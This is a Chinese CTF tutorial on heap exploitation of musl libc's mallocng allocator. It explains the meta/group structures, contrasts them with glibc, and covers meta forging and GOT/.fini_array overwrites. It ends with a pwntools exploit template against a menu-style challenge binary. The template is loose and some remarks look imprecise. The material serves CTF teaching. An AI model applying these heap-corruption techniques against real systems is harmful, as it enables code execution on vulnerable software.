---
title: musl libc pwn —— mallocng 的 meta/group 结构差异与利用
category: pwn
tags: [musl, mallocng, meta, group, 堆利用]
signals: [二进制静态链接且 ldd 显示 not a dynamic executable, 程序用 alpine 或 musl 编译, 堆上找不到 tcache 或 main_arena, free 后 chunk 头部没有任何 size 字段, 题目把 musl 源码或 libc.so 一起打包, 堆布局与 glibc 完全不同且偏移对不上]
difficulty: hard
source: "musl mallocng 源码 / pzhxbz 新版 musl libc 浅析 / NCC Group CVE-2022-24834"
tools: [pwntools, gdb, pwndbg, musl-gcc, pahole]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- `file ./pwn` 显示 `statically linked`，`ldd ./pwn` 回 `not a dynamic executable`，`strings` 里出现 `musl`。
- 附加包里带 `libc.so`（很小，约 600KB）或直接给 musl 源码，题面写「Alpine」「static」。
- `gdb` 里 `p main_arena` / `p tcache` 全部不存在；堆上前后 chunk **没有 `size` 字段**。
- 用 glibc 的偏移脚本（`__free_hook`、`_IO_list_all`）完全对不上。
- 2021 年后的 musl 题基本都是 **mallocng**（旧版是 `oldmalloc`，行为接近 dlmalloc）。
- 题目给的 chunk 大小不是 16 的整数倍也能正常分配（musl 的 size class 粒度是 4 字节）。

## 二、原理

### 1. musl 有两代分配器

| 版本 | 分配器 | 特征 |
| --- | --- | --- |
| `< 1.2.0`（2019 前） | `oldmalloc`（dlmalloc 风格） | chunk 有 `size` 前后指针，接近 glibc ptmalloc |
| `>= 1.2.0` | **mallocng** | 无 chunk 头，靠 `meta` / `group` 管理，所有元信息集中存放 |

本篇只讲 **mallocng**，这也是当前 CTF 的主流。

### 2. 核心数据结构

```c
struct malloc_context {          // 全局单例 ctx
    uint64_t secret;             // 随机值，用于 meta_area->check 校验
    struct meta *active[48];     // 48 个 size class 的活跃组
    struct meta_area *meta_area_head, *meta_area_tail;
    size_t usage_by_class[48];
    // ... 省略 pagesize / brk / avail_meta 等字段
};

struct meta_area {               // 页对齐，check == ctx.secret
    uint64_t check;
    struct meta_area *next;
    int nslots;
    struct meta slots[];
};

struct meta {
    struct meta *prev, *next;    // active[] 中的双向链表
    struct group *mem;
    volatile int avail_mask, freed_mask;   // 位图
    uintptr_t last_idx:5, freeable:1, sizeclass:6, maplen:(64-12);
};

struct group {                   // 一组同 size 的 slot
    struct meta *meta;
    unsigned char active_idx:5;
    char pad[UNIT - sizeof(struct meta *) - 1];
    unsigned char storage[];     // 各 slot 从这里开始
};
```

### 3. 每个 slot 的「隐形头」

用户拿到的指针 `p` 前 4 字节是**协议字节**（不是 chunk 头）：

```
p[-4] : zero（或 offset 高位标记）
p[-3] : 低 5 位 = idx（在 group 中的序号），高 3 位 = reserved 信息
p[-2..-1] : uint16 offset（相对于 group->storage 的 UNIT 偏移）
p     : 用户数据
```

`free(p)` 时 `get_meta(p)` 用 `offset` 反推 `group`：`base = p - UNIT*offset - UNIT`，
然后 `base->meta` 拿到 `meta`，并逐项 `assert`（`meta->mem == base`、`index <= last_idx`、
`area->check == ctx.secret`、`offset` 与 `sizeclass` 匹配）。

### 4. 与 glibc 的差异对照

| 维度 | glibc ptmalloc | musl mallocng |
| --- | --- | --- |
| chunk 头 | 16 字节 `prev_size/size` | **无**，仅 `p[-4..-1]` 4 字节 |
| 元信息位置 | 分散在 chunk 内 | 集中在 `meta` / `meta_area`（独立 mmap） |
| 空闲链 | tcache/fastbin/small/large/unsorted | `avail_mask` / `freed_mask` 位图 |
| 越界写一步 | 改下一个 chunk 的 `size` | 只能改 `meta` 才有效果 |
| 关键校验 | `size` 一致性 | `meta_area->check == ctx.secret` |
| 可能的目标 | `__free_hook`、IO_FILE | 静态链接：直接改 `GOT` / `init_array` |

### 5. 利用思路

- **meta 伪造**：若能泄露 `meta_area` 并把 `check` 改成 `ctx.secret`，就能让 `free` 走向 `nontrivial_free` 的 `unlink`（`dequeue` 双向链表）。
- **跨组重叠**：篡改 `active_idx` / `last_idx` 使同一片 storage 被当成两个不同 size 的 slot。
- **静态链接的优势**：musl 二进制通常**没有 PIE + NX**（或仅有 PIE），`.bss` / GOT 地址固定，
  拿到任意写后直接改 `.fini_array` 或 `qword ptr [GOT]` 比 FSOP 简单得多。
- **旧版 `oldmalloc`**：行为接近 glibc，可复用 fastbin / unlink 思路，但**没有 tcache**。

## 三、解题步骤

1. **确认 libc 类型与版本**
   ```bash
   file ./pwn && ldd ./pwn || true
   strings -a ./pwn | grep -i musl        # 静态链接时看字符串
   pwndbg> p sizeof(struct meta)          # 有调试符号时（题常给）
   ```
2. **找分配器入口**：musl 的 `malloc`/`free` 符号在静态链接时可定位，`p `ctx`` 可看 `malloc_context`。
3. **确定漏洞类型**：UAF / double free / off-by-null / 越界。mallocng 对 UAF 非常敏感 ——
   `free` 后 `p[-3]` 被置 `255`，再次 `free` 会命中 `assert` 直接 abort（**没有 tcache dup**）。
4. **泄漏**：优先找 `meta_area` 页（`ctx.meta_area_head`），或利用静态二进制固定的 `.bss`。
5. **利用**：改 `GOT` / `.fini_array`（静态链接无需 libc 基址）；或用 meta 伪造走 `nontrivial_free` 的 `dequeue`。
6. **触发**：`free` 一个伪造指针，或让程序退出走 `exit`（musl 也会跑 `__libc_exit_fini`）。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# musl mallocng · 静态链接题的通用套路：UAF 改 GOT / fini_array
from pwn import *

context.binary = elf = ELF('./pwn')
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

io = process(elf.path)

def add(size, data=b''):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    if data:
        io.sendafter(b'data: ', data)

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def show(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx: ', str(idx).encode())

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())

# ---------- 1. 定位关键地址 ----------
# 静态链接、无 PIE 时 fini_array 地址固定；musl 没有 __free_hook
target_arr = elf.sym['__fini_array_start']
log.info(f'fini_array @ {hex(target_arr)}')

# ---------- 2. 利用 UAF / 越界写拿到元信息 ----------
# mallocng 中相邻 slot 之间没有 chunk 头，溢出直接踩到 next slot 的用户数据
add(0x20, b'A' * 0x20)        # 0
add(0x20, b'B' * 0x20)        # 1
add(0x20, b'C' * 0x20)        # 2

# 泄漏：若 show 存在，读出 slot 里的残留（可能是 meta/group 指针）
show(1)
leak = io.recv(8)
log.info(f'leak = {leak.hex()}')

# ---------- 3. 写目标 ----------
# 典型场景：程序有任意写，或 UAF 后 edit 一个已 free 的 chunk
# 这里演示把 fini_array[0] 改成 win()（static 链接下地址固定）
payload = flat({0x20: elf.sym['win']}, length=0x40, filler=b'\x00')
edit(0, payload)               # 越界写到下一个 slot（或直接 UAF 写）

io.sendlineafter(b'> ', b'5')  # 退出触发 fini_array
io.interactive()
```

### 关键：伪造 `meta` 让 `free` 走 `nontrivial_free`

前提是已泄露 `ctx.secret`（来自 `meta_area->check`）与某个 `meta` 地址。接下来：
① 造一页 `meta_area` 把 `check` 写成 `secret`；② 造 `group` 使 `base->meta` 指向伪造 `meta` 且 `meta->mem == base`；
③ `free(伪造指针)` 时所有 `assert` 通过，若 `freed_mask` 全满就会 `dequeue(&ctx.active[sc], g)`，
双向链表指针可控 —— 这一步等价于 glibc 的 unlink。

## 五、常见坑 / 变体

1. **大量 `assert`**：`free` 里约 7 个 `assert`（对齐 / index / check / size），任一不满足即 `abort`，
   必须**先拿到 `ctx.secret`** 才能伪造 `meta`。
2. **没有 tcache / fastbin**：glibc 的 double free、tcache poisoning 手法全部失效。
3. **不要按 16 对齐去算**：musl 的 `size_class` 粒度是 4 字节，`0x21` 与 `0x24` 可能在同一类。
4. **`oldmalloc` 老题目权限要注意**：`malloc(0)`、`realloc(p, 0)` 行为与 glibc 不同。
5. **静态链接 = 地址固定**：多数 musl 题不开 PIE，`.bss` 上直接改 `fini_array` 最简单。
6. **版本差异**：`1.2.0` 之前的 `oldmalloc` 可以复用 dl 的 unlink；`1.2.0+` 必须按 mallocng。
7. **`madvise` 释放页**：`free` 大 slot 时会 `madvise(MADV_FREE)`，泄露可能读到全 0。
8. **NCC Group CVE-2022-24834** 提供了完整的 nl_chase 实战路径，适合作为进阶阅读。

## 六、参考来源

- [musl 源码：`src/malloc/mallocng/meta.h`（meta/group 定义）](https://elixir.bootlin.com/musl/latest/source/src/malloc/mallocng/meta.h)
- [pzhxbz：新版 musl libc 浅析（size_classes / alloc_slot / enframe 流程图解）](https://pzhxbz.cn/posts/musl-libc-mallocng)
- [NCC Group：musl mallocng heap exploitation（CVE-2022-24834）](https://www.nccgroup.com/research/pumping-iron-on-the-musl-heap-real-world-cve-2022-24834-exploitation-on-an-alpine-mallocng-heap)
- [musl 官方 WHATSNEW（版本与分配器变更）](https://git.musl-libc.org/cgit/musl/tree/WHATSNEW)
- [pwndbg 文档（musl 调试支持）](https://github.com/pwndbg/pwndbg)
- [CTF-Wiki 堆利用入口（对比 glibc 章节）](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/)
